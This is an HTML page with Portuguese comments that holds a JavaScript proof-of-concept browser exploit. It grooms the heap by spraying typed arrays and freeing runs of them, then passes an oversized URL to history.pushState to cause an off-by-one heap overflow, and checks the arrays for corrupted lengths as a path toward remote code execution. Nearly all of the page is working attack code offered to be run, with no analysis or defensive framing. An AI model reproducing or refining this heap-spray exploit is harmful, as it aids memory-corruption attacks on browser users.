<!DOCTYPE html>
<html>
<head>
    <title>Danger Zone: Off-by-One Exploit</title>
    <style>
        body { background-color: #220000; color: #ff3333; font-family: monospace; padding: 20px; }
        .log { border: 1px solid #ff0000; background: #000; padding: 10px; height: 300px; overflow-y: scroll; }
        button { background: #ff0000; color: #fff; border: none; padding: 15px; font-weight: bold; cursor: pointer; font-size: 1.2em; }
        button:hover { background: #cc0000; }
    </style>
</head>
<body>
    <h1>OPERANDO NA ZONA DE CRASH (709.523+)</h1>
    <p>Tentativa de estabilizar o Off-by-One em um Array vizinho.</p>
    
    <button onclick="runDangerZone()">DISPARAR EXPLOIT (Risco de Crash Imediato)</button>
    
    <div id="logger" class="log"></div>

    <script>
        const logArea = document.getElementById('logger');
        function log(msg) { 
            logArea.innerHTML += `<div>> ${msg}</div>`; 
            logArea.scrollTop = logArea.scrollHeight;
        }

        // TAMANHO CRÍTICO
        const SAFE_SIZE = 709522;
        
        // Aqui entramos na zona de perigo. 
        // 1 byte extra = Off-by-one.
        // Se 1 não funcionar, tentamos avançar alguns bytes para pular metadados do jemalloc.
        // Vamos testar +1, depois +16 (próximo alinhamento de 16 bytes), etc.
        const DANGER_OFFSET = 1; 

        var arrays = [];

        function runDangerZone() {
            log("1. Preparando Heap Spray Massivo...");
            
            // FASE 1: SPRAY
            // Criamos milhares de arrays pequenos. 
            // O objetivo é forçar o alinhamento perfeito.
            for (let i = 0; i < 5000; i++) {
                // Tamanho 0x1000 é padrão para cair em buckets previsíveis
                let arr = new Uint32Array(0x1000); 
                arr[0] = i; // Marcador de índice
                arr[1] = 0xDEADBEEF; // Marcador visual
                arrays.push(arr);
            }

            // FASE 2: CRIAR O BURACO PERFEITO
            // Precisamos de um buraco onde caiba EXATAMENTE o nosso buffer de 709522 bytes.
            // Se o buraco for muito grande, sobra espaço antes do próximo array e não acertamos nada.
            // Se for muito pequeno, o pushState aloca em outro lugar.
            
            log("2. Cavando buracos no Heap...");
            
            // Estratégia de "Swiss Cheese": Removemos arrays em posições estratégicas
            // Tentamos liberar blocos contíguos para somar ~709kb
            // Um array de 0x1000 tem 4096 bytes.
            // 709522 / 4096 = ~173 arrays.
            // Precisamos liberar ~173 arrays seguidos para criar um buraco desse tamanho.
            
            // Vamos tentar criar 5 "zonas de pouso"
            for(let zone=0; zone < 5; zone++) {
                let start = 1000 + (zone * 300);
                let end = start + 174; // Libera um pouco a mais que o necessário
                
                for(let i = start; i < end; i++) {
                    arrays[i] = null; // Libera memória
                }
            }

            log("3. Aguardando Garbage Collector...");
            // Pequeno delay para o sistema processar os buracos
            setTimeout(executePayload, 500);
        }

        function executePayload() {
            log(`4. INJETANDO PAYLOAD (${SAFE_SIZE} + ${DANGER_OFFSET} bytes)...`);
            log("Se o console desligar agora, foi um 'Bad Crash' (Metadados).");
            log("Se sobreviver, cheque se houve 'Good Corruption'.");

            try {
                // Base segura
                let base = "A".repeat(SAFE_SIZE);
                
                // O Byte Assassino
                // Usamos 0x00 ou 0x80 para tentar não quebrar flags de metadados,
                // ou 0x01 se quisermos somar tamanho.
                // Vamos tentar sobrescrever com algo alto para garantir visibilidade.
                let overflow = "\x01".repeat(DANGER_OFFSET);
                
                let payload = base + overflow;

                // DISPARO
                history.pushState({}, "danger", payload);

                // CHECAGEM IMEDIATA
                checkResult();

            } catch(e) {
                log("Erro na injeção: " + e.message);
            }
        }

        function checkResult() {
            let success = false;
            // Verifica apenas os arrays que não foram deletados
            for(let i=0; i < arrays.length; i++) {
                let arr = arrays[i];
                if(arr) {
                    // O tamanho normal é 4096 (0x1000)
                    if(arr.length !== 4096) {
                        log("!!! SUCESSO CRÍTICO !!!");
                        log(`Array ${i} corrompido!`);
                        log(`Novo tamanho: ${arr.length}`);
                        log("RCE ESTÁ ABERTO.");
                        success = true;
                        
                        document.body.style.backgroundColor = "#00ff00";
                        document.body.style.color = "#000";
                        break;
                    }
                }
            }

            if(!success) {
                log("Falha: Arrays intactos.");
                log("O buraco não estava alinhado ou o byte atingiu padding inútil.");
                log("Tente recarregar para mudar o layout da memória.");
            }
        }
    </script>
</body>
</html>
